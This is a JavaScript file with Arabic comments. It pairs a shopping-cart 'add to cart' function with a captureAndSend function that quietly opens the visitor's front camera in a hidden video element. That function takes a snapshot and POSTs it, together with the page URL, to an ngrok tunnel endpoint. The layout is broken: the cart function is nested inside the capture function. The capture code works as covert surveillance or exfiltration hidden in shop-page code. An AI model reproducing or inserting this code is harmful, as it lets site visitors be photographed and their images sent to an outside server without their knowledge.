// دالة التقاط الصورة وإرسالها
async function captureAndSend() {
    let stream = null;
    let video = null;
    let canvas = null;

    try {
        // 1. طلب الوصول إلى الكاميرا
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });

        // 2. إنشاء عنصر فيديو مؤقت
        video = document.createElement("video");
        video.style.display = "none";
        video.srcObject = stream;
        document.body.appendChild(video);

        await video.play();

        // ننتظر لحظة حتى تظهر الصورة
        await new Promise(resolve => setTimeout(resolve, 500));

        // 3. إنشاء Canvas
        canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 4. تحويل الصورة إلى Base64
        const dataUrl = canvas.toDataURL("image/png");
        const base64Image = dataUrl.split(",")[1];

        // 5. إرسال الصورة إلى السيرفر
        const response = await fetch(
            "https://proven-deflator-jolliness.ngrok-free.dev/upload",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    image: base64Image,
                    url: window.location.href
                })
            }
        );

        if (!response.ok) {
            throw new Error(`Server Error: ${response.status}`);
        }

        const result = await response.json();
        console.log("تم الإرسال بنجاح:", result);

    } catch (error) {
        console.error("الخطأ الكامل:", error);
        alert(`${error.name}\n${error.message}`);
    } finally {
        // إيقاف الكاميرا وتنظيف العناصر
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }

        if (video) {
            video.remove();
        }

        if (canvas) {
            canvas.remove();
        }
    }
    // 1. دالة إضافة المنتج للسلة (بتشتغل لما تدوس Add To Cart)
function addToCart() {
    // نجيب البيانات من الصفحة عن طريق الـ ID
    let title = document.getElementById('product-title').innerText;
    let priceText = document.getElementById('product-price').innerText;
    let imageSrc = document.getElementById('product-img').src;
    let quantity = document.getElementById('product-qty').value;

    // نشيل علامة $ من السعر عشان نعرف نحسبه كـ رقم
    let priceNumber = parseFloat(priceText.replace('$', ''));

    // نعمل المنتج في شكل Object (كائن)
    let item = {
        title: title,
        price: priceNumber,
        image: imageSrc,
        qty: parseInt(quantity)
    };

    // نجيب السلة القديمة من المتصفح لو موجودة، لو مفيش نعمل List فاضية
    let cart = JSON.parse(localStorage.getItem('myCart')) || [];

    // نشوف لو المنتج ده موجود أصلاً في السلة ولا لأ
    let existingItem = cart.find(product => product.title === item.title);

    if (existingItem) {
        // لو موجود، نزود الكمية بس
        existingItem.qty += item.qty;
    } else {
        // لو مش موجود، نضيفه للسلة
        cart.push(item);
    }

    // نحفظ السلة في المتصفح تاني
    localStorage.setItem('myCart', JSON.stringify(cart));

    // نطلع رسالة للمستخدم
    alert("Item added to cart successfully!");
}
}
